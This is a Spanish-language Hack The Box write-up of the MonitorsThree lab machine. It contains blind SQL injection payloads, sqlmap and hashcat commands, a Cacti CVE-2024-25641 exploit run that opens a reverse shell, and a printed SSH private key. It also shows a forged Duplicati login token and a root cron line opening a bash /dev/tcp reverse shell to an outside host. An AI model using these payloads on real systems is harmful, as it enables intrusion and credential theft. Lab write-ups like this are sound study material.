---
title: MonitorsThree
description: MonitorsThree es una máquina Linux de dificultad media que cuenta con un sitio web para una empresa que ofrece soluciones de redes. El sitio web tiene una página de "olvide contraseña" vulnerable a la inyección SQL, que se aprovecha para obtener acceso a las credenciales. Una enumeración más detallada del sitio web revela un subdominio que presenta una instancia de Cacti a la que se puede acceder con las credenciales obtenidas de la inyección SQL. La instancia de Cacti es vulnerable a CVE-2024-25641, que se aprovecha para afianzarse en el sistema. Una enumeración más detallada del sistema revela las credenciales utilizadas para acceder a la base de datos, donde se encuentran los hashes y se descifran para obtener la contraseña del usuario. Esto luego se utiliza para obtener acceso a las claves privadas SSH, lo que lleva al acceso SSH al sistema. La enumeración de los puertos abiertos en el sistema revela una instancia de Duplicati vulnerable, que se aprovecha para obtener un shell como root.
date: 2024-12-20
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-monitorsthree/monitorsthree_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - linux
  - hack_the_box
  - ssh
  - http
  - tcp
  - fuzzing_web
  - sqli_blind
  - password_attacks
  - cve
  - rce
  - interactive_tty
  - data_leaks
  - port_forwarding
  - cron_abuse
  - devtools
  - information_gathering
  - web_analysis
  - vulnerability_exploitation
  - foothold
  - lateral_movement
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/htb/machines/monitorsthree:-$ ping -c 1 10.10.11.30
PING 10.10.11.30 (10.10.11.30) 56(84) bytes of data.
64 bytes from 10.10.11.30: icmp_seq=1 ttl=63 time=252 ms

--- 10.10.11.30 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 251.592/251.592/251.592/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/monitorsthree:-$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.30 -oG nmap1
Host: 10.10.11.30 ()     Status: Up
Host: 10.10.11.30 ()     Ports: 22/open/tcp//ssh///, 80/open/tcp//http///        Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/monitorsthree:-$ sudo nmap -sCV -p22,80 10.10.11.30 -vvv -oN nmap2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNwl884vMmev5jgPEogyyLoyjEHsq+F9DzOCgtCA4P8TH2TQcymOgliq7Yzf7x1tL+i2mJedm2BGMKOv1NXXfN0=
|   256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN5W5QMRdl0vUKFiq9AiP+TVxKIgpRQNyo25qNs248Pa
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://monitorsthree.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/htb/machines/monitorsthree:-$ echo '10.10.11.30\tmonitorsthree.htb' | sudo tee -a /etc/hosts 
```
```terminal
/home/kali/Documents/htb/machines/monitorsthree:-$ whatweb monitorsthree.htb       
http://monitorsthree.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[sales@monitorsthree.htb], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.30], JQuery, Script, Title[MonitorsThree - Networking Solutions], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

---
## Web Analysis

En este caso, la web inicial es sencilla y no ofrece muchas opciones visibles.

![](assets/img/htb-writeup-monitorsthree/monitorsthree1_1.png)

El botón de `Login` redirige a un formulario de inicio de sesión.

![](assets/img/htb-writeup-monitorsthree/monitorsthree1_2.png)

La página `forgot_password.php` expone un comportamiento interesante, permite detectar usuarios válidos debido a que responde de manera distinta cuando un usuario existe o no en el sistema.

![](assets/img/htb-writeup-monitorsthree/monitorsthree1_4.png)

Logré identificar que el usuario `admin` es válido.

![](assets/img/htb-writeup-monitorsthree/monitorsthree1_3.png)

Utilicé ffuf para descubrir subdominios adicionales.

```terminal
/home/kali/Documents/htb/machines/monitorsthree:-$ ffuf -u http://monitorsthree.htb/ -H "HOST:FUZZ.monitorsthree.htb" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -t 200 -c
```

![](assets/img/htb-writeup-monitorsthree/monitorsthree1_5.png)

La herramienta arrojó múltiples resultados con un tamaño de respuesta de 13560 bytes, el mismo que el de la página principal.

```terminal
/home/kali/Documents/htb/machines/monitorsthree:-$ curl -s http://monitorsthree.htb/ | wc -c
13560
```

Para filtrar las respuestas que no sean relevantes, ajusté el escaneo de ffuf para ignorar aquellas cuyo tamaño coincida con el de la página principal.

```terminal
/home/kali/Documents/htb/machines/monitorsthree:-$ ffuf -u http://monitorsthree.htb/ -H "HOST:FUZZ.monitorsthree.htb" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -t 200 -c -fs 13560
```

![](assets/img/htb-writeup-monitorsthree/monitorsthree1_6.png)

```terminal
/home/kali/Documents/htb/machines/monitorsthree:-$ sudo sed -i '$d' /etc/hosts
/home/kali/Documents/htb/machines/monitorsthree:-$ echo '10.10.11.30\tmonitorsthree.htb\tcacti.monitorsthree.htb' | sudo tee -a /etc/hosts
```

En el subdominio encontrado, se muestra un formulario de inicio de sesión del servicio Cacti.

![](assets/img/htb-writeup-monitorsthree/monitorsthree1_7.png)

---
## Vulnerability Exploitation


En la página `forgot_password.php`, descubrí que el campo de entrada es vulnerable a SQL Injection.

```sql
admin'--
```

![](assets/img/htb-writeup-monitorsthree/monitorsthree2_1.png)

```sql
admin'-- -
```

![](assets/img/htb-writeup-monitorsthree/monitorsthree2_2.png)

Aquí se presenta específicamente SQL Injection basada en respuestas condicionales.

La condición `1=1` siempre es verdadera. Si el usuario `admin` es válido, la aplicación responde con:
* "Successfully sent password reset request!".
* "Content-Length: `3385`".

```sql
admin' AND '1'='1'-- -
```

![](assets/img/htb-writeup-monitorsthree/monitorsthree2_3.png)

Por otro lado, la condición `1=2` siempre es falsa. Aunque el usuario `admin` sea válido, la web responde con:
* "Unable to process request, try again!".
* "Content-Length: `3380`".

```sql
admin' AND '1'='2'-- -
```

![](assets/img/htb-writeup-monitorsthree/monitorsthree2_4.png)

Al inyectar la siguiente condición, introduje una subconsulta que intenta recuperar un valor específico de la tabla `users`. 

Esta subconsulta busca en la tabla `users` un usuario cuyo `username` sea igual a `admin`. Si se encuentra, devuelve el valor `'a'`, La consulta principal compara el resultado de la subconsulta con `='a'`. La condición resulta verdadera.

Respuesta de la web
* "Content-Length: `3385`".

```sql
admin' AND (SELECT 'a' FROM users WHERE username='admin')='a'-- -
```

![](assets/img/htb-writeup-monitorsthree/monitorsthree2_5.png)

En lugar de verificar la existencia de un usuario, introduzco deliberadamente un valor diferente al esperado para forzar un error en la comparación.

En este caso, la subconsulta devuelve `'a'` (porque el usuario admin existe), pero la comparación con `='b'` falla, resultando en una condición falsa.

Respuesta de la web
* "Content-Length: `3380`".

```sql
admin' AND (SELECT 'a' FROM users WHERE username='admin')='b'-- -
```

![](assets/img/htb-writeup-monitorsthree/monitorsthree2_6.png)

De forma similar a la validación del usuario, es posible determinar la longitud de la contraseña del usuario `admin` mediante inyecciones condicionales. La idea es comparar la longitud de la contraseña almacenada en la base de datos con diferentes valores y observar cómo responde la web.

Respuesta de la web
* "Content-Length: `3385`".

```sql
admin' AND (SELECT 'a' FROM users WHERE username='admin' AND CHAR_LENGTH(password)>=32)='a'-- -
```

![](assets/img/htb-writeup-monitorsthree/monitorsthree2_7.png)

Respuesta de la web
* "Content-Length: `3380`".

```sql
admin' AND (SELECT 'a' FROM users WHERE username='admin' AND CHAR_LENGTH(password)>=33)='a'-- -
```

![](assets/img/htb-writeup-monitorsthree/monitorsthree2_8.png)

Con el usuario admin identificado y la longitud de su contraseña determinada, el siguiente paso es extraer la contraseña carácter por carácter.

La función `SUBSTRING()` permite obtener un carácter específico de una cadena. En este caso, se extrae el primer carácter de la contraseña del usuario admin:

```sql
admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'-- -
```

![](assets/img/htb-writeup-monitorsthree/monitorsthree2_9.png)
![](assets/img/htb-writeup-monitorsthree/monitorsthree2_10.png)

Identificamos que el primer carácter de la contraseña del usuario admin es un "3", ya que es el único payload que produce una respuesta con un Length diferente.

![](assets/img/htb-writeup-monitorsthree/monitorsthree2_11.png)

Para revelar el resto de la contraseña, aplico el mismo método usado previamente, pero modificando el índice en la función `SUBSTRING()` para obtener cada carácter de forma secuencial.

```sql
admin' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='admin')='a'-- -
```

Tambien se puede utilizar SQLmap para explotar la vulnerabilidad.

```terminal
/home/kali/Documents/htb/machines/monitorsthree:-$ sqlmap -u "http://10.10.11.30/forgot_password.php" --level 5 --risk 3 --batch --current-user admin -D MySQL

/home/kali/Documents/htb/machines/monitorsthree:-$ sqlmap -r monitors.req -dbms=mysql --dump
```

El hash extraído corresponde al algoritmo MD5.

```terminal
/home/kali/Documents/htb/machines/monitorsthree:-$ hashcat --show '31a181c8372e3afc59dab863430610e8'
   # | Name                                            | Category
=====+=================================================+==============================
   0 | MD5                                             | Raw Hash
```

<https://crackstation.net/>

![](assets/img/htb-writeup-monitorsthree/monitorsthree2_12.png)

---
## Foothold

![](assets/img/htb-writeup-monitorsthree/monitorsthree3_1.png)
![](assets/img/htb-writeup-monitorsthree/monitorsthree3_2.png)

Una vez autenticado en Cacti, noto que la versión utilizada es 1.2.26, la cual es vulnerable a [CVE-2024-25641](https://nvd.nist.gov/vuln/detail/CVE-2024-25641).

Para explotar esta vulnerabilidad, utilicé el siguiente [exploit](https://github.com/5ma1l/CVE-2024-25641/tree/master).

```terminal
/home/kali/Documents/htb/machines/monitorsthree:-$ wget https://raw.githubusercontent.com/5ma1l/CVE-2024-25641/refs/heads/master/exploit.py

/home/kali/Documents/htb/machines/monitorsthree:-$ nc -nlvp 4321
	listening on [any] 4321 ...

/home/kali/Documents/htb/machines/monitorsthree:-$ python3 exploit.py http://cacti.monitorsthree.htb/cacti/ admin greencacti2001 -p /home/kali/Documents/tools/php-reverse-shell.php
```

![](assets/img/htb-writeup-monitorsthree/monitorsthree3_3.png)

```terminal
	... connect to [10.10.16.84] from (UNKNOWN) [10.10.11.30] 43266

$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@monitorsthree:/$ ^Z
zsh: suspended  nc -lnvp 1234

/home/kali/Documents/htb/machines/monitorsthree:-$ stty raw -echo;fg
[1]  + continued  nc -lnvp 1234
                               reset
reset: unknown terminal type unknown
Terminal type? xterm

www-data@monitorsthree:/$ export TERM=xterm
www-data@monitorsthree:/$ export SHELL=bash

/home/kali/Documents/htb/machines/monitorsthree:-$ stty size
42 86

www-data@monitorsthree:/$ stty rows 42 columns 86

www-data@monitorsthree:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---
## Lateral Movement

```terminal
www-data@monitorsthree:/$ cat /etc/passwd | grep /bash$
root:x:0:0:root:/root:/bin/bash
marcus:x:1000:1000:Marcus:/home/marcus:/bin/bash
```

Encuentro credenciales para una base de datos MySQL.

```terminal
www-data@monitorsthree:/$ cat /var/www/html/app/admin/db.php
```

![](assets/img/htb-writeup-monitorsthree/monitorsthree4_0.png)

El puerto 3306 está activo en el sistema, lo que confirma que el servicio MySQL está funcionando.

```terminal
www-data@monitorsthree:/$ ss -tulnp
```

![](assets/img/htb-writeup-monitorsthree/monitorsthree4_1.png)

Confirmo la presencia de las credenciales utilizadas por los usuarios de la aplicación Cacti, incluyendo el hash previamente dumpeado por SQLi.

```terminal
www-data@monitorsthree:/$ mysql -u app_user -p -h 127.0.0.1 -P 3306
Enter password: php_app_password

MariaDB [(none)]> USE monitorsthree_db;

MariaDB [(monitorsthree_db)]> select * from users;
```

![](assets/img/htb-writeup-monitorsthree/monitorsthree4_2.png)

Encontré credenciales adicionales para el servicio MySQL en el archivo `/html/cacti/include/config.php`.

```terminal
www-data@monitorsthree:~/html/cacti/include$ cat config.php
```

![](assets/img/htb-writeup-monitorsthree/monitorsthree4_3.png)

Utilizando las nuevas credenciales, accedo a la base de datos Cacti. Dentro encuentro una tabla de usuarios con hashes de contraseñas.

```terminal
www-data@monitorsthree:/$ mysql -u cactiuser -p -h 127.0.0.1 -P 3306
Enter password: cactiuser

MariaDB [(none)]> USE cacti;

MariaDB [(cacti)]> select * from user_auth;
```

![](assets/img/htb-writeup-monitorsthree/monitorsthree4_4.png)


```terminal
/home/kali/Documents/htb/machines/monitorsthree:-$ echo '$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK' > hash.txt

/home/kali/Documents/htb/machines/monitorsthree:-$ hashcat --show hash.txt
```

![](assets/img/htb-writeup-monitorsthree/monitorsthree4_5.png)

```terminal
/home/kali/Documents/htb/machines/monitorsthree:-$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK:12345678910
```

```terminal
www-data@monitorsthree:/$ su marcus
Password: 12345678910

marcus@monitorsthree:~$ id
uid=1000(marcus) gid=1000(marcus) groups=1000(marcus)
```

```terminal
marcus@monitorsthree:~$ cat .ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAqgvIpzJXDWJOJejC3CL0m9gx8IXO7UBIfGplG1XCC6GhqPQh8OXK
rPkApFwR1k4oJkxQJi0fG2oSWmssfwqwY4FWw51sNIALbSIV3UIlz8/3ufN0zmB4WHacS+
k7hOP/rJ8GjxihThmh6PzC0RbpD/wCCCvF1qX+Bq8xc7797xBR4KfPaA9OgB0uvEuzVWco
MYII6QvznQ1FErJnOiceJoxRrl0866JmOf6moP66URla5+0sLta796+ARDNMQ2g4geh53p
ja3nZYq2QAi1b66GIRmYUGz4uWunRJ+6kUvf7QVmNgmmnF2cVYFpdlBp8WAMZ2XyeqhTkh
Z4fg6mwPyQfloTFYxw1jv96F+Kw4ET1tTL+PLQL0YpHgRTelkCKBxo4/NiGs6LTEzsucyq
Dedke5o/5xcIGnU/kTtwt5xXZMqmojXOywf77vomCuLHfcyePf2vwImF9Frs07lo3ps7pK
ipf5cQ4wYN5V7I+hFcie5p9eeG+9ovdw7Q6qrD77AAAFkIu0kraLtJK2AAAAB3NzaC1yc2
EAAAGBAKoLyKcyVw1iTiXowtwi9JvYMfCFzu1ASHxqZRtVwguhoaj0IfDlyqz5AKRcEdZO
KCZMUCYtHxtqElprLH8KsGOBVsOdbDSAC20iFd1CJc/P97nzdM5geFh2nEvpO4Tj/6yfBo
8YoU4Zoej8wtEW6Q/8Aggrxdal/gavMXO+/e8QUeCnz2gPToAdLrxLs1VnKDGCCOkL850N
RRKyZzonHiaMUa5dPOuiZjn+pqD+ulEZWuftLC7Wu/evgEQzTENoOIHoed6Y2t52WKtkAI
tW+uhiEZmFBs+Llrp0SfupFL3+0FZjYJppxdnFWBaXZQafFgDGdl8nqoU5IWeH4OpsD8kH
5aExWMcNY7/ehfisOBE9bUy/jy0C9GKR4EU3pZAigcaOPzYhrOi0xM7LnMqg3nZHuaP+cX
CBp1P5E7cLecV2TKpqI1zssH++76Jgrix33Mnj39r8CJhfRa7NO5aN6bO6SoqX+XEOMGDe
VeyPoRXInuafXnhvvaL3cO0Oqqw++wAAAAMBAAEAAAGAAxIKAEaO9xZnRrjh0INYCA8sBP
UdlPWmX9KBrTo4shGXYqytDCOUpq738zginrfiDDtO5Do4oVqN/a83X/ibBQuC0HaC0NDA
HvLQy0D4YQ6/8wE0K8MFqKUHpE2VQJvTLFl7UZ4dVkAv4JhYStnM1ZbVt5kNyQzIn1T030
zAwVsn0tmQYsTHWPSrYgd3+36zDnAJt+koefv3xsmhnYEZwruXTZYW0EKqLuKpem7algzS
Dkykbe/YupujChCK0u5KY2JL9a+YDQn7mberAY31KPAyOB66ba60FUgwECw0J4eTLMjeEA
bppHadb5vQKH2ZhebpQlTiLEs2h9h9cwuW4GrJl3vcVqV68ECGwqr7/7OvlmyUgzJFh0+8
/MFEq8iQ0VY4as4y88aMCuqDTT1x6Zqg1c8DuBeZkbvRDnU6IJ/qstLGfKmxg6s+VXpKlB
iYckHk0TAs6FDngfxiRHvIAh8Xm+ke4ZGh59WJyPHGJ/6yh3ie7Eh+5h/fm8QRrmOpAAAA
wHvDgC5gVw+pMpXUT99Xx6pFKU3M1oYxkhh29WhmlZgvtejLnr2qjpK9+YENfERZrh0mv0
GgruxPPkgEtY+MBxr6ycuiWHDX/xFX+ioN2KN2djMqqrUFqrOFYlp8DG6FCJRbs//sRMhJ
bwi2Iob2vuHV8rDhmRRq12iEHvWEL6wBhcpFYpVk+R7XZ5G4uylCzs27K9bUEW7iduys5a
ePG4B4U5NV3mDhdJBYtbuvwFdL7J+eD8rplhdQ3ICwFNC1uQAAAMEA03BUDMSJG6AuE6f5
U7UIb+k/QmCzphZ82az3Wa4mo3qAqulBkWQn65fVO+4fKY0YwIH99puaEn2OKzAGqH1hj2
y7xTo2s8fvepCx+MWL9D3R9y+daUeH1dBdxjUE2gosC+64gA2iF0VZ5qDZyq4ShKE0A+Wq
4sTOk1lxZI4pVbNhmCMyjbJ5fnWYbd8Z5MwlqmlVNzZuC+LQlKpKhPBbcECZ6Dhhk5Pskh
316YytN50Ds9f+ueqxGLyqY1rHiMrDAAAAwQDN4jV+izw84eQ86/8Pp3OnoNjzxpvsmfMP
BwoTYySkRgDFLkh/hzw04Q9551qKHfU9/jBg9BH1cAyZ5rV/9oLjdEP7EiOhncw6RkRRsb
e8yphoQ7OzTZ0114YRKdafVoDeb0twpV929S3I1Jxzj+atDnokrb8/uaPvUJo2B0eDOc7T
z6ZnzxAqKz1tUUcqYYxkCazMN+0Wx1qtallhnLjy+YaExM+uMHngJvVs9zJ2iFdrpBm/bt
PA4EYA8sgHR2kAAAAUbWFyY3VzQG1vbml0b3JzdGhyZWUBAgMEBQYH
-----END OPENSSH PRIVATE KEY-----
```
```terminal
/home/kali/Documents/htb/machines/monitorsthree:-$ chmod 600 id_rsa

/home/kali/Documents/htb/machines/monitorsthree:-$ ssh marcus@monitorsthree.htb -i id_rsa

marcus@monitorsthree:~$ cat user.txt
```

---
## Privilege Escalation

```terminal
marcus@monitorsthree:~$ ss -tulnp
```

![](assets/img/htb-writeup-monitorsthree/monitorsthree5_1.png)

```terminal
/home/kali/Documents/htb/machines/monitorsthree:-$ ssh -L 8200:127.0.0.1:8200 marcus@monitorsthree.htb -i id_rsa -N -f
```

Al acceder al puerto redirigido confirmo que el servicio en ejecución es Duplicati.

![](assets/img/htb-writeup-monitorsthree/monitorsthree5_2.png)

El servicio Duplicati presenta una vulnerabilidad que permite eludir la autenticación de inicio de sesión utilizando el Server Passphrase.

<https://github.com/duplicati/duplicati/issues/5197>

<https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee>

```terminal
marcus@monitorsthree:~$ find / -name '*duplicati*' 2>/dev/null
```

![](assets/img/htb-writeup-monitorsthree/monitorsthree5_3.png)

```terminal
marcus@monitorsthree:~$ ls -al /opt/duplicati/config/
-rw-r--r-- 1 root root   90112 Dec 20 22:10 Duplicati-server.sqlite
```

```terminal
/home/kali/Documents/htb/machines/monitorsthree:-$ nc -lvp 4321 > Duplicati-server.sqlite 
	listening on [any] 4321 ...
	
marcus@monitorsthree:/opt/duplicati/config$ nc 10.10.16.84 4321 < Duplicati-server.sqlite

	... connect to [10.10.16.84] from monitorsthree.htb [10.10.11.30] 52332
```

Abro la base de datos utilizando sqlitebrowser para extraer el `Server_passphrase`

```terminal
/home/kali/Documents/htb/machines/monitorsthree:-$ sqlitebrowser Duplicati-server.sqlite
```

![](assets/img/htb-writeup-monitorsthree/monitorsthree5_4.png)
![](assets/img/htb-writeup-monitorsthree/monitorsthree5_5.png)

Decodifico el passphrase y convierto el resultado en hexadecimal.

```terminal
echo 'Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=' | base64 -d | xxd -p -c 256
59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a
```

Intercepto una solicitud de inicio de sesión fallido con Burp Suite.

![](assets/img/htb-writeup-monitorsthree/monitorsthree6_0.png)

Configuro el interceptor en "Do Intercept > Response to this request". Y la doy a Foward.

![](assets/img/htb-writeup-monitorsthree/monitorsthree6_1.png)

Extraigo los valores de interés del response interceptado.
* Nonce: ```"Nonce": "LXvXjDAJVXgBezoVXcXW+psVClH8j15IbkSn4FWnJ18="```
* Salt: (Debe coincidir con el valor de `server-passphrase-salt` en `Duplicati-server.sqlite`).

![](assets/img/htb-writeup-monitorsthree/monitorsthree6_2.png)


Utilizo el Nonce y el Server-passphrase decodificado para generar un token de autenticación válido.

```javascript
var saltedpwd = "59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a";

var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('LXvXjDAJVXgBezoVXcXW+psVClH8j15IbkSn4FWnJ18=') + saltedpwd)).toString(CryptoJS.enc.Base64);

console.log(noncedpwd);
```

![](assets/img/htb-writeup-monitorsthree/monitorsthree6_3.png)

El script genera un token de autenticación válido basado en la combinación del Nonce y el Server-passphrase.

```
SOZ7kd2Q6gC7XdffvKuB27Bgw9N/ayYRCnR/bHrEkYE=
```

En Burp Suite, reenvío la solicitud interceptada al servidor hasta encontrar el parámetro `password`.

![](assets/img/htb-writeup-monitorsthree/monitorsthree6_4.png)

Modifico el parámetro `password` de la solicitud  y lo reemplazo por el token generado (noncedpwd). Es necesario URL encodear el token antes de enviarlo para garantizar que sea interpretado correctamente por el servidor.

![](assets/img/htb-writeup-monitorsthree/monitorsthree6_5.png)

Después de modificar y reenviar la solicitud, observo que se ha completado el inicio de sesión en la interfaz web de Duplicati sin necesidad de la contraseña original.

![](assets/img/htb-writeup-monitorsthree/monitorsthree7_1.png)

Procedo a crear un archivo de cron que ejecutará una reverse shell con permisos de root. Este archivo se guarda en el directorio personal de Marcus y se utiliza Duplicati para crear un respaldo de este archivo y restaurarlo como una tarea de cron. Esto resulta en la ejecución del comando como root, lo que conduce a una ejecución remota de comandos.

```terminal
marcus@monitorsthree:~$ echo '* * * * * root /bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.81/4321 0>&1"' > shell
```

Este archivo está configurado para ejecutarse cada minuto con permisos de root.

![](assets/img/htb-writeup-monitorsthree/monitorsthree7_2.png)
![](assets/img/htb-writeup-monitorsthree/monitorsthree7_3.png)
![](assets/img/htb-writeup-monitorsthree/monitorsthree7_4.png)
![](assets/img/htb-writeup-monitorsthree/monitorsthree7_5.png)
![](assets/img/htb-writeup-monitorsthree/monitorsthree7_6.png)
![](assets/img/htb-writeup-monitorsthree/monitorsthree7_7.png)

```terminal
/home/kali/Documents/htb/machines/monitorsthree:-$ nc -nvlp 4321
	listening on [any] 4321 ...
```

![](assets/img/htb-writeup-monitorsthree/monitorsthree7_8.png)

Utilizo la función de restaurar de Duplicati, especificando que los archivos se restauren en el directorio `/etc/cron.d`, donde los archivos de cron son reconocidos y ejecutados automáticamente.

![](assets/img/htb-writeup-monitorsthree/monitorsthree7_9.png)
![](assets/img/htb-writeup-monitorsthree/monitorsthree8_1.png)
![](assets/img/htb-writeup-monitorsthree/monitorsthree8_2.png)

Verifico en mi listener de Netcat y confirmo que se ha recibido una conexión como el usuario root.

```terminal
	... connect to [10.10.16.81] from (UNKNOWN) [10.10.11.30] 49750

root@monitorsthree:~# cat root.txt 
```

> <a href="https://labs.hackthebox.com/achievement/machine/1521382/622" target="_blank">***Litio7 has successfully solved Monitorsthree from Hack The Box***</a>
{: .prompt-info style="text-align:center" }

